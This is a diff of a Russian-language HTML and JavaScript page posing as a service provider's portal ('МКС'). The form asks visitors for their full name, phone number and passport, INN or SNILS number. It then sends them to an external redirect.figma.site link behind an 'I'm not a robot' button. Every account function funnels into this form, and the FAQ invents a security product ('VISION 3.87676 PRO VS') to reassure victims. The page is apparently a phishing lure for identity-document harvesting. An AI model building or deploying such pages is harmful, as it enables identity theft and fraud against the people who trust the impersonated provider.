@@ -1,221 +1,268 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>МКС-бот веб</title>
-<style>
+  <meta charset="UTF-8">
+  <title>МКС — веб-интерфейс</title>
+  <style>
     body {
-        font-family: Arial, sans-serif;
-        background: #e0e0f0;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-        min-height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      margin: 0;
+      padding: 0;
     }
-    #chat {
-        max-width: 500px;
-        width: 100%;
-        margin: 20px;
-        background: #fff;
-        border-radius: 12px;
-        padding: 20px;
-        box-shadow: 0 6px 16px rgba(0,0,0,0.15);
-        display: flex;
-        flex-direction: column;
+    header {
+      background: #0f0;
+      color: #000;
+      padding: 20px;
+      text-align: center;
+      font-size: 1.5em;
+      font-weight: bold;
     }
-    .message {
-        margin: 10px 0;
-        padding: 10px 15px;
-        border-radius: 12px;
-        max-width: 90%;
-        word-wrap: break-word;
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      padding: 20px;
+      background: #111;
+      border: 2px solid #0f0;
+      border-radius: 15px;
     }
-    .bot {
-        background: #f3f3f8;
-        color: #222;
-        align-self: flex-start;
-    }
-    .user {
-        background: #6c63ff;
-        color: #fff;
-        text-align: right;
-        align-self: flex-end;
-    }
-    #buttons {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 10px;
-        margin-top: 10px;
+    .hidden {
+      display: none;
     }
     button {
-        flex: 1 1 48%;
-        min-width: 120px;
-        padding: 12px 0;
-        border-radius: 10px;
-        border: none;
-        cursor: pointer;
-        font-size: 15px;
-        font-weight: 600;
-        transition: 0.2s;
-        text-align: center;
+      background: #0f0;
+      color: #000;
+      border: none;
+      padding: 12px 20px;
+      margin: 8px 0;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 1em;
+      font-weight: bold;
+      transition: 0.3s;
     }
-    .menu-btn {
-        background: linear-gradient(135deg, #6c63ff, #8e85ff);
-        color: #fff;
-    }
-    .menu-btn:hover {
-        background: linear-gradient(135deg, #5751d1, #6f6cff);
-    }
-    .back-btn {
-        background: #ccc;
-        color: #333;
-    }
-    .back-btn:hover {
-        background: #aaa;
+    button:hover {
+      background: #fff;
+      color: #000;
     }
     input {
-        width: 100%;
-        padding: 12px;
-        border-radius: 8px;
-        border: 1px solid #ccc;
-        font-size: 15px;
-        margin: 5px 0;
-        box-sizing: border-box;
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #0f0;
+      background: #000;
+      color: #fff;
     }
-    a.button-link {
-        text-decoration: none;
-        display: inline-block;
-        text-align: center;
-        padding: 12px 0;
-        border-radius: 10px;
-        background: linear-gradient(135deg, #6c63ff, #8e85ff);
-        color: #fff;
-        width: 100%;
-        font-weight: 600;
-        margin-top: 5px;
+    .back-btn {
+      background: #333;
+      color: #fff;
     }
-    a.button-link:hover {
-        background: linear-gradient(135deg, #5751d1, #6f6cff);
+    .back-btn:hover {
+      background: #555;
     }
-</style>
+    .message {
+      padding: 10px;
+      margin: 10px 0;
+      background: #0f0;
+      color: #000;
+      border-radius: 8px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-<div id="chat">
-    <div class="message bot">🏠 Добро пожаловать в МКС-бот! 📡 Управляйте своими услугами легко и быстро! 🌐</div>
-    <div id="buttons"></div>
+<header>🏠 Добро пожаловать в МКС! 📡</header>
+
+<div class="container">
+
+  <!-- Главное меню -->
+  <div id="mainMenu">
+    <button onclick="startForm()">📝 Обновить данные</button>
+    <button onclick="showAuthRequired()">🔄 Поменять тариф</button>
+    <button onclick="showAuthRequired()">💳 Проверить баланс</button>
+    <button onclick="showAuthRequired()">💸 Пополнить баланс</button>
+    <button onclick="showAdditional()">🛠️ Дополнительные услуги</button>
+  </div>
+
+  <!-- Форма: ФИО -->
+  <div id="formFullname" class="hidden">
+    <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+    <input type="text" id="fullname" placeholder="Фамилия Имя Отчество">
+    <button onclick="saveFullname()">Далее</button>
+    <button class="back-btn" onclick="goMain()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- Форма: телефон -->
+  <div id="formPhone" class="hidden">
+    <p><b>Введите номер телефона</b></p>
+    <input type="text" id="phone" placeholder="+79991234567">
+    <button onclick="savePhone()">Далее</button>
+    <button class="back-btn" onclick="backToFullname()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- Форма: тип документа -->
+  <div id="formDocType" class="hidden">
+    <p>Выберите документ:</p>
+    <button onclick="chooseDoc('Паспорт')">📄 Паспорт</button>
+    <button onclick="chooseDoc('ИНН')">🧾 ИНН</button>
+    <button onclick="chooseDoc('СНИЛС')">🟢 СНИЛС</button>
+    <button class="back-btn" onclick="backToPhone()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- Форма: номер документа -->
+  <div id="formDocNum" class="hidden">
+    <p id="docPrompt"></p>
+    <input type="text" id="docNumber">
+    <button onclick="saveDocNumber()">Подтвердить</button>
+    <button class="back-btn" onclick="backToDocType()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- Финал -->
+  <div id="finalStep" class="hidden">
+    <div class="message">
+      ❗️Последний шаг❗️<br>
+      Для обновления данных подтвердите, что вы человек 👇
+    </div>
+    <a href="https://redirect.figma.site/" target="_blank">
+      <button>Я не робот ✅</button>
+    </a>
+    <button class="back-btn" onclick="goMain()">🏠 Главное меню</button>
+  </div>
+
+  <!-- Доп. услуги -->
+  <div id="additionalMenu" class="hidden">
+    <button onclick="showFAQ()">❓ Часто задаваемые вопросы</button>
+    <button onclick="showInstruction()">ℹ️ Инструкция</button>
+    <button onclick="showSupport()">📞 Связаться с техподдержкой</button>
+    <button class="back-btn" onclick="goMain()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- FAQ -->
+  <div id="faqMenu" class="hidden">
+    <button onclick="faq('⏳ До какого числа нужно передавать показания?','📌 До 25 числа каждого месяца.')">⏳ До какого числа нужно передавать показания?</button>
+    <button onclick="faq('💸 Что будет, если не передать данные вовремя?','⚠️ Плата будет начислена по среднему.')">💸 Что будет, если не передать данные вовремя?</button>
+    <button onclick="faq('🔒 Это безопасно?','🔒 Да, защита VISION 3.87676 PRO VS.')">🔒 Это безопасно?</button>
+    <button onclick="faq('⚡️ Почему через Telegram?','⚡️ Для удобства и перехода на цифровые площадки.')">⚡️ Почему через Telegram?</button>
+    <button onclick="faq('🔁 Можно ли исправить ошибку?','✅ Да, можно. Свяжитесь с поддержкой.')">🔁 Можно ли исправить ошибку?</button>
+    <button onclick="faq('📑 Какие документы можно использовать?','👉 Паспорт, ИНН, СНИЛС.')">📑 Какие документы можно использовать?</button>
+    <button class="back-btn" onclick="showAdditional()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- Вывод ответа FAQ -->
+  <div id="faqAnswer" class="hidden">
+    <div class="message" id="faqText"></div>
+    <button class="back-btn" onclick="showFAQ()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- Инструкция -->
+  <div id="instruction" class="hidden">
+    <div class="message">
+      📋 Чтобы обновить данные:<br>
+      1️⃣ Нажмите «Обновить данные».<br>
+      2️⃣ Введите номер телефона.<br>
+      3️⃣ Выберите документ и введите его номер.<br>
+      4️⃣ Подтвердите действие. 🌐<br><br>
+      На любом этапе можно вернуться назад. 📡
+    </div>
+    <button class="back-btn" onclick="showAdditional()">↩️ Вернуться назад</button>
+  </div>
+
+  <!-- Поддержка -->
+  <div id="support" class="hidden">
+    <a href="https://t.me/MyMKCsup" target="_blank">
+      <button>📞 Написать в техподдержку</button>
+    </a>
+    <button class="back-btn" onclick="showAdditional()">↩️ Вернуться назад</button>
+  </div>
+
 </div>
 
 <script>
-const chat = document.getElementById('chat');
-const buttonsDiv = document.getElementById('buttons');
+  let userData = {};
 
-const mainMenu = [
-    { text: "📝 Обновить данные", action: startForm },
-    { text: "🔄 Поменять тариф", action: unauthorizedAction },
-    { text: "💳 Проверить баланс", action: unauthorizedAction },
-    { text: "💸 Пополнить баланс", action: unauthorizedAction },
-    { text: "🛠️ Дополнительные услуги", action: additionalServicesMenu }
-];
+  function hideAll() {
+    document.querySelectorAll('.container > div').forEach(d => d.classList.add('hidden'));
+  }
+  function goMain() {
+    hideAll();
+    document.getElementById('mainMenu').classList.remove('hidden');
+  }
+  function startForm() {
+    hideAll();
+    document.getElementById('formFullname').classList.remove('hidden');
+  }
+  function saveFullname() {
+    const val = document.getElementById('fullname').value.trim();
+    if (!/^[А-Яа-яЁё\s-]+$/.test(val)) {
+      alert("❌ ФИО должно содержать только буквы!");
+      return;
+    }
+    userData.fullname = val;
+    hideAll();
+    document.getElementById('formPhone').classList.remove('hidden');
+  }
+  function savePhone() {
+    const phone = document.getElementById('phone').value.trim();
+    const digits = phone.replace(/\D/g,'');
+    if (!(phone.startsWith('+7') || phone.startsWith('7'))) {
+      alert("❌ Телефон должен начинаться с +7 или 7!");
+      return;
+    }
+    if (digits.length < 10 || digits.length > 11) {
+      alert("❌ Телефон должен содержать 10 или 11 цифр!");
+      return;
+    }
+    userData.phone = phone;
+    hideAll();
+    document.getElementById('formDocType').classList.remove('hidden');
+  }
+  function chooseDoc(type) {
+    userData.docType = type;
+    hideAll();
+    document.getElementById('formDocNum').classList.remove('hidden');
+    let prompt = "";
+    if (type==="Паспорт") prompt="Введите серию и номер паспорта (пример: 4510 123456)";
+    if (type==="ИНН") prompt="Введите ИНН (пример: 500100732259)";
+    if (type==="СНИЛС") prompt="Введите СНИЛС (пример: 112-233-445 95)";
+    document.getElementById('docPrompt').innerText = prompt;
+  }
+  function saveDocNumber() {
+    const val = document.getElementById('docNumber').value.trim();
+    if (!val) {
+      alert("❌ Введите номер документа!");
+      return;
+    }
+    userData.docNumber = val;
+    hideAll();
+    document.getElementById('finalStep').classList.remove('hidden');
+  }
 
-const additionalMenu = [
-    { text: "❓ Часто задаваемые вопросы", action: faqMenu },
-    { text: "ℹ️ Инструкция", action: instruction },
-    { text: "📞 Связаться с техподдержкой", action: contactSupport },
-    { text: "↩️ Вернуться назад", action: showMainMenu }
-];
+  // Назад
+  function backToFullname() { hideAll(); document.getElementById('formFullname').classList.remove('hidden'); }
+  function backToPhone() { hideAll(); document.getElementById('formPhone').classList.remove('hidden'); }
+  function backToDocType() { hideAll(); document.getElementById('formDocType').classList.remove('hidden'); }
 
-const backButton = [{ text: "↩️ Вернуться назад", action: showMainMenu }];
+  // Авторизация треб.
+  function showAuthRequired() {
+    alert("⚠️ Необходимо авторизоваться!");
+    startForm();
+  }
 
-let state = {};
-let formData = {};
+  // Доп. меню
+  function showAdditional() { hideAll(); document.getElementById('additionalMenu').classList.remove('hidden'); }
+  function showFAQ() { hideAll(); document.getElementById('faqMenu').classList.remove('hidden'); }
+  function showInstruction() { hideAll(); document.getElementById('instruction').classList.remove('hidden'); }
+  function showSupport() { hideAll(); document.getElementById('support').classList.remove('hidden'); }
+  function faq(q,a) {
+    hideAll();
+    document.getElementById('faqText').innerText = q + "\n\n" + a;
+    document.getElementById('faqAnswer').classList.remove('hidden');
+  }
 
-function addMessage(text, sender='bot') {
-    const msg = document.createElement('div');
-    msg.className = 'message ' + sender;
-    msg.innerHTML = text;
-    chat.appendChild(msg);
-    chat.scrollTop = chat.scrollHeight;
-}
-
-function showButtons(menu) {
-    buttonsDiv.innerHTML = '';
-    menu.forEach(btn => {
-        const button = document.createElement('button');
-        button.textContent = btn.text;
-        button.onclick = btn.action;
-        button.className = btn.text.includes("↩️") ? 'back-btn' : 'menu-btn';
-        buttonsDiv.appendChild(button);
-    });
-}
-
-function showMainMenu() {
-    state = {};
-    addMessage("🏠 Добро пожаловать в МКС-бот! 📡 Управляйте своими услугами легко и быстро! 🌐");
-    showButtons(mainMenu);
-}
-
-function unauthorizedAction() {
-    addMessage("Мы не можем выполнить действие, потому что вы не авторизовались. ⚠️");
-    showButtons([{ text: "🔐 Авторизоваться", action: startForm }, { text: "↩️ Сменить действие", action: showMainMenu }]);
-}
-
-function additionalServicesMenu() {
-    addMessage("🛠️ Выберите опцию: 🌐");
-    showButtons(additionalMenu);
-}
-
-function faqMenu() {
-    const faq = [
-        { q: "⏳ До какого числа нужно передавать показания?", a: "📌 Показания счетчиков нужно передавать до 25 числа каждого месяца. 📡" },
-        { q: "💸 Что будет, если не передать данные вовремя?", a: "⚠️ Плата будет начислена по среднему — исходя из показаний за последние полгода. ⚡️" },
-        { q: "🔒 Это безопасно?", a: "🔒 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). 🌐" },
-        { q: "⚡️ Почему через Telegram?", a: "⚡️ Для удобства и переход на цифровые площадки. 📡" },
-        { q: "🔁 Можно ли исправить ошибку?", a: "✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌐" },
-        { q: "📑 Какие документы можно использовать?", a: "👉 Паспорт, ИНН, СНИЛС. 📡" },
-        { q: "↩️ Вернуться назад", action: showMainMenu }
-    ];
-    const menu = faq.map(f => ({ text: f.q, action: () => f.a ? addMessage(f.a) && showButtons(backButton) : f.action() }));
-    addMessage("❓ Часто задаваемые вопросы: 🌐");
-    showButtons(menu);
-}
-
-function instruction() {
-    const text = `📋 Чтобы обновить данные:
-1️⃣ Нажмите «Обновить данные».
-2️⃣ Отправьте номер телефона.
-3️⃣ Выберите документ и введите его номер.
-4️⃣ Получите подтверждение. 🌐
-
-На любом этапе вы можете нажать '↩️ Вернуться назад'. 📡`;
-    addMessage(text);
-    showButtons(backButton);
-}
-
-function contactSupport() {
-    addMessage('📞 Для связи с техподдержкой нажмите на кнопку: <a class="button-link" href="https://t.me/MyMKCsup" target="_blank">Написать в техподдержку</a> 🌐');
-    showButtons(backButton);
-}
-
-// ===== Форма =====
-function startForm() {
-    state.step = 'fullname';
-    addMessage("<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>");
-    addMessage("👤 Укажите Фамилию Имя Отчество полностью (только текст): 🌐");
-    showInput(handleFormInput);
-}
-
-function showInput(callback) {
-    buttonsDiv.innerHTML = '<input type="text" id="inputField" placeholder="Введите данные..."><button class="menu-btn" onclick="submitInput()">Отправить</button>';
-    window.submitInput = () => {
-        const val = document.getElementById('inputField').value.trim();
-        callback(val);
-    };
-}
-
-function handleFormInput(val) {
-    if (val === "↩️ Вернуться назад") return showMainMenu();
-
-    switch(state.step) {
+  goMain(); // старт
+</script>
+</body>
+</html>
